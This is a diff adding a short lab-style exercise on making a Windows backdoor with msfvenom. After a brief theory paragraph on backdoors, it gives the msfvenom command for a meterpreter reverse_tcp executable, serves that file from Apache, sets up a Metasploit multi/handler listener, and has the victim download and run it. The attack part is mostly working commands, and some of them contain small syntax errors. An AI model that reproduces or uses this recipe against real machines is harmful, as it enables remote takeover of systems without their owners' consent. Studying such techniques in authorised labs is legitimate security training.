@@ -1,0 +1,29 @@
+3.Creation of backdoor using msfvenom
+Aim: Creation of backdoor using msf venom in windows machine
+Theory: A backdoor is a means to access a computer system or encrypted data that
+bypasses the system's customary security mechanisms
+A developer may create a backdoor so that an application or operating system can be
+accessed for troubleshooting or other purposes. However, attackers often use backdoors
+that they detect or install themselves as part of an exploit. In some cases, a worm or virus
+is designed to take advantage of a backdoor created by an earlier attack.
+Backdoors can vary widely. Some, for example, are put in place by legitimate vendors,
+while others are introduced inadvertently as a result of programming errors. Developers
+sometimes use backdoors during the development process, which are then not removed
+from production code.
+Backdoors are also commonly put into place through malware. A malware module may
+act as a backdoor or a first-line backdoor, which means it acts as a staging platform for
+downloading other malware modules designed to perform the attack.
+=============================================================
+msfvenom -p windows/meterpreter/reverse_tcp lhost=<ip of kali> lport 4444 --arch x86 --platform windows-f exe -o backdoor.exe
+sudo mv backdoor.exe /var/www/html
+service apache2 start
+==Open another terminal in kali Linux and run the following commands
+<<msf console>>
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lhost
+set lport
+run/exploit
+==Open windows machine and go to the url: http:<kali ip>//backdoor.exe
+A popup window will come there by pressing the run button; The backdoor will
+install on the windows machine
